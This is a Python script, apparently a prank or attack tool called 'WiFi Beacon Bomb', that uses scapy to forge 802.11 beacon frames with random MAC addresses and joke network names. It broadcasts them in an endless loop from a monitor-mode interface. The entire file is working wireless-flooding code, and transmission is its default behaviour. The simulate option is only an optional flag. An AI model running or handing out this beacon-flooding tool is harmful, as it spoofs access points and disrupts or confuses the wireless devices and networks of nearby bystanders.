import os
import sys
import time
import random
import argparse
from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp

SSID_LIST = [
    "Searching...",
    "Loading_WiFi_99%",
    "Get_Your_Own_WiFi",
    "Connecting_to_FBI_van...",
    "Virus_Infected_AP",
    "Router_Not_Found",
    "Password_is_12345678",
    "Click_Here_For_Free_RAM",
    "Tell_My_WiFi_Love_Her",
    "No_Free_WiFi_Here",
    "Win_XP_Error_404",
    "Searching_for_signal...",
    "cheeky-breeky-iv-WANkey",
    "what_are_you_looking",
    "english_or_spanish",
    "english_or_english",
    "kim_jong_WAN",
    "FBI_network",
    "buy_you_own_rounter_you_thief",
    "gameover_zeus_network",
    "anakin_skyLANker",
    "ankara_LANSSI"
]

DEFAULT_IFACE = os.getenv("WIFI_BOMB_IFACE", "wlan0mon")
DEFAULT_TOTAL = int(os.getenv("WIFI_BOMB_TOTAL", "1000"))
DEFAULT_INTERVAL = float(os.getenv("WIFI_BOMB_INTERVAL", "0.005"))

def generate_random_mac():
    bytes_list = [0x02, random.randint(0x00, 0x7f), random.randint(0x00, 0xff),
                  random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
    return ":".join(f"{b:02x}" for b in bytes_list)

def build_beacon_frame(ssid, mac):
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    rates = Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
    dsset = Dot11Elt(ID="DSset", info=bytes([random.randint(1, 13)]))
    return RadioTap() / dot11 / beacon / essid / rates / dsset

def parse_args():
    parser = argparse.ArgumentParser(description="WiFi Beacon Bomb Core Engine")
    parser.add_argument("--iface", default=DEFAULT_IFACE, help="Monitor mode interface")
    parser.add_argument("--total", type=int, default=DEFAULT_TOTAL, help="Number of fake APs per cycle")
    parser.add_argument("--interval", type=float, default=DEFAULT_INTERVAL, help="Seconds between packets")
    parser.add_argument("--simulate", action="store_true", help="Simulate without transmitting packets")
    parser.add_argument("--verbose", action="store_true", help="Print per-packet info to stdout")
    return parser.parse_args()

def main():
    args = parse_args()
    print(f"[+] Starting Beacon Bomb Core")
    print(f"[+] Interface: {args.iface} | Total: {args.total} | Interval: {args.interval}s | Simulate: {args.simulate}")

    sent_count = 0
    try:
        while True:
            for i in range(args.total):
                ssid = random.choice(SSID_LIST)
                mac = generate_random_mac()
                pkt = build_beacon_frame(ssid, mac)

                if not args.simulate:
                    sendp(pkt, iface=args.iface, count=1, verbose=False)

                sent_count += 1

                if args.verbose:
                    print(f"[{sent_count}] Broadcast SSID: {ssid} ({mac}) on {args.iface}")

                time.sleep(args.interval)

    except KeyboardInterrupt:
        print("\n[-] Beacon Bomb stopped by user.")
        sys.exit(0)

if __name__ == "__main__":
    main()
